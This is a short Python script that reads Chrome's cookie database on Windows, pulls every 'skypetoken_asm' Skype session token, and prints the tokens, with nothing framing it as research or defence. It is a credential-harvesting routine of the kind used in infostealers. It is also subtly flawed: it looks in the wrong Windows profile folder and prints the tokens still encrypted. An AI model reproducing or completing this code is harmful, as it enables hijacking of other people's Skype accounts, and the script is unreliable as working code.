import os
import sqlite3

def extract_skype_tokens_from_chrome():
    # Get the default path to the Chrome profile directory on Windows
    appdata_path = os.getenv('APPDATA')
    chrome_profile_path = os.path.join(appdata_path, 'Google', 'Chrome', 'User Data')

    # Construct the full path to the Chrome cookies database file
    cookies_db_path = os.path.join(chrome_profile_path, 'Default', 'Cookies')

    # Check if the cookies database file exists
    if not os.path.isfile(cookies_db_path):
        print("Chrome cookies database file not found.")
        return

    # Connect to the cookies database and execute the query
    conn = sqlite3.connect(cookies_db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT encrypted_value FROM cookies WHERE name = "skypetoken_asm"')

    # Fetch the Skype tokens from the query result
    skype_tokens = [row[0] for row in cursor.fetchall()]

    # Process or utilize the Skype tokens as needed
    for i, token in enumerate(skype_tokens, start=1):
        # Perform actions with each Skype token
        print(f"Skype Token #{i}: {token}")

    # Close the cursor and the database connection
    cursor.close()
    conn.close()

# Example usage:
extract_skype_tokens_from_chrome()
